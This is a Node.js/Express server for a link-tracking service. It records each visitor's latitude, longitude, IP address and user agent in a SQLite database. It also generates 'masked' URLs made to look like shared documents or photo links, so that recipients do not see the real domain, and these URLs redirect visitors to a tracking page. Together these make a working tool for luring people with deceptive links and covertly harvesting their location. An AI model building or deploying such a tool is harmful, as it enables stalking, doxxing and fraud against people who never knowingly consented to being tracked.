const express = require('express');
const { nanoid } = require('nanoid');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());
app.use(express.static('public'));

// Initialize SQLite database
const db = new sqlite3.Database('./tracker.db', (err) => {
    if (err) {
        console.error('Database connection error:', err.message);
    } else {
        console.log('Connected to the tracker database.');
    }
});

// Create tables if they don't exist
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS links (
    id TEXT PRIMARY KEY,
    name TEXT,
    custom_url TEXT,
    custom_slug TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

    db.run(`CREATE TABLE IF NOT EXISTS visits (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    link_id TEXT,
    latitude REAL,
    longitude REAL,
    ip_address TEXT,
    user_agent TEXT,
    visited_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (link_id) REFERENCES links (id)
  )`);
});

// API Routes

// Create a new tracking link
app.post('/api/links', (req, res) => {
    try {
        const { name, customUrl, customSlug } = req.body;
        const id = customSlug || nanoid(8); // Use custom slug if provided, otherwise generate one

        console.log('Creating link:', { name, customUrl, customSlug, id });

        // Check if custom slug already exists
        if (customSlug) {
            db.get('SELECT id FROM links WHERE id = ?', [customSlug], (err, row) => {
                if (err) {
                    console.error('Database error:', err);
                    return res.status(500).json({ error: err.message });
                }

                if (row) {
                    return res.status(400).json({ error: 'Custom slug already in use. Please choose another one.' });
                }

                insertLink();
            });
        } else {
            insertLink();
        }

        function insertLink() {
            db.run('INSERT INTO links (id, name, custom_url, custom_slug) VALUES (?, ?, ?, ?)',
                [id, name, customUrl || null, customSlug || null],
                function (err) {
                    if (err) {
                        console.error('Database error:', err);
                        return res.status(500).json({ error: err.message });
                    }

                    // Generate tracking URLs
                    const baseUrl = req.protocol + '://' + req.get('host');
                    const standardTracking = `${baseUrl}/t/${id}`;

                    // Generate masked URLs that don't reveal the actual domain
                    // For demonstration, we'll create a URL that looks like a file sharing link
                    const maskedUrl = `${baseUrl}/file/shared-document-${id.substring(0, 4)}.html`;
                    const photoUrl = `${baseUrl}/photo/view-${id}.html`;

                    const response = {
                        id,
                        name,
                        custom_url: customUrl || null,
                        url: standardTracking,
                        masked_urls: {
                            file: maskedUrl,
                            photo: photoUrl
                        }
                    };

                    console.log('Response:', response);
                    res.status(201).json(response);
                }
            );
        }
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Get all links
app.get('/api/links', (req, res) => {
    db.all('SELECT * FROM links ORDER BY created_at DESC', [], (err, rows) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }

        // Add masked URLs to each link
        const baseUrl = req.protocol + '://' + req.get('host');
        const links = rows.map(link => {
            return {
                ...link,
                url: `${baseUrl}/t/${link.id}`,
                masked_urls: {
                    file: `${baseUrl}/file/shared-document-${link.id.substring(0, 4)}.html`,
                    photo: `${baseUrl}/photo/view-${link.id}.html`
                }
            };
        });

        res.json(links);
    });
});

// Get a specific link with its visits
app.get('/api/links/:id', (req, res) => {
    const { id } = req.params;

    db.get('SELECT * FROM links WHERE id = ?', [id], (err, link) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }

        if (!link) {
            return res.status(404).json({ error: 'Link not found' });
        }

        db.all('SELECT * FROM visits WHERE link_id = ? ORDER BY visited_at DESC', [id], (err, visits) => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }

            const baseUrl = req.protocol + '://' + req.get('host');
            const response = {
                ...link,
                url: `${baseUrl}/t/${link.id}`,
                masked_urls: {
                    file: `${baseUrl}/file/shared-document-${link.id.substring(0, 4)}.html`,
                    photo: `${baseUrl}/photo/view-${link.id}.html`
                },
                visits
            };

            res.json(response);
        });
    });
});

// Record a visit with location data
app.post('/api/track/:id', (req, res) => {
    const { id } = req.params;
    const { latitude, longitude } = req.body;
    const ip_address = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const user_agent = req.headers['user-agent'];

    db.run(
        'INSERT INTO visits (link_id, latitude, longitude, ip_address, user_agent) VALUES (?, ?, ?, ?, ?)',
        [id, latitude, longitude, ip_address, user_agent],
        function (err) {
            if (err) {
                return res.status(500).json({ error: err.message });
            }

            res.status(201).json({ success: true });
        }
    );
});

// Handle file route for masked URLs
app.get('/file/:filename', (req, res) => {
    const filename = req.params.filename;
    const idMatch = filename.match(/shared-document-(.{4})\.html/);

    if (!idMatch) {
        return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
    }

    const idPrefix = idMatch[1];

    // Find link with matching ID prefix
    db.all('SELECT id FROM links', [], (err, links) => {
        if (err) {
            return res.status(500).sendFile(path.join(__dirname, 'public', '404.html'));
        }

        const matchedLink = links.find(link => link.id.startsWith(idPrefix));

        if (!matchedLink) {
            return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
        }

        // Redirect to track route with found ID
        res.redirect(`/track.html?id=${matchedLink.id}&type=file`);
    });
});

// Handle photo route for masked URLs
app.get('/photo/:filename', (req, res) => {
    const filename = req.params.filename;
    const idMatch = filename.match(/view-(.+)\.html/);

    if (!idMatch) {
        return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
    }

    const id = idMatch[1];

    // Verify link exists
    db.get('SELECT * FROM links WHERE id = ?', [id], (err, link) => {
        if (err || !link) {
            return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
        }

        // Redirect to track page with this ID
        res.redirect(`/track.html?id=${id}&type=photo`);
    });
});

// Redirect based on custom URL if available
app.get('/t/:id', (req, res) => {
    const { id } = req.params;

    db.get('SELECT * FROM links WHERE id = ?', [id], (err, link) => {
        if (err || !link) {
            return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
        }

        if (link.custom_url) {
            res.redirect(`/track.html?id=${id}&redirect=${encodeURIComponent(link.custom_url)}`);
        } else {
            res.sendFile(path.join(__dirname, 'public', 'tracker.html'));
        }
    });
});

// Serve the main app for any other routes
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
}); 